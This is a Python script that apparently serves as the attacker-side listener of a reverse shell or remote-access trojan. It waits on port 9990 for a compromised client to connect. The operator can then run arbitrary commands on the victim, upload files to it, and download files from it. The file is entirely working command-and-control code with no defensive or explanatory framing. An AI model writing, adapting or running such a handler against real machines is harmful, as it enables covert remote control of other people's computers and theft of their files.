from  datetime import datetime
import json
import socket 
import base64
from typing import List
from array import *
import time
from filecode_class import Filecode
import os.path

def on_split(line :str):
    result_line :list = line.split(" ")
    return result_line

def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("10.137.203.165", 9990))
    listener.listen(0)
    print("[+] Waiting for incoming connections")
    cl_socket, remote_address = listener.accept()
    print(f"[+] Got a connection from {remote_address} ")

    try:

        while True:
            command :str = input(">> ")
            command_list :list = on_split(command)
            if "upload" in command:
                data = Filecode.on_code(command_list[1])
                command_on_client :str = command_list[0] +' '+ command_list[1] +' '+ str(len(data)) + ' '
                cl_socket.send(command_on_client.encode() + data)

                response = cl_socket.recv(1024).decode()
                print(response)

            elif "download" in command:
                command_out :str = command_list[0] + ' ' + command_list[1]
                cl_socket.send(command_out.encode())

                response = cl_socket.recv(1024).decode()
                lenght_list :list = on_split(response)

                while len(lenght_list[1]) != int(lenght_list[0]):
                    lenght_list[1] = lenght_list[1] + cl_socket.recv(1024).decode()
                Filecode.on_decode(command_list[1], lenght_list[1])

                _, file = command_list[1].split("/")
                print(f"File {file} is downloaded")
            
            else:
                cl_socket.send(command.encode())
                response :str = cl_socket.recv(1024).decode()
                print(response)
        
    except KeyboardInterrupt:
        listener.close()
        exit()

if __name__ == "__main__":
    main() 